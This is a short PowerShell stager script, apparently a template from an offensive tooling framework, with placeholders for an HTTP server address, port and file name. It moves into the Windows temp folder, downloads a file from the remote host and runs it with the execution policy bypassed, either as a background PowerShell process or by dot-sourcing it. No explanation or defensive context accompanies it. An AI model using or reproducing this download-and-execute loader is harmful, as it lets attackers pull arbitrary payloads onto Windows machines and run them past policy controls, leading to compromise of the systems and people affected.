$background = $true;
cd C:\windows\temp;
try { $fileExists = Test-Path "${filename}" } catch { $fileExists = $false };
if (-not $fileExists) { iwr -Uri "http://${http_ip}:${http_port}/${filename}" -OutFile "${filename}";};
if ($background) { 
    Start-Process -FilePath "powershell" -ArgumentList "-ep bypass ./${filename}";
}
else { 
    . .\${filename};
}
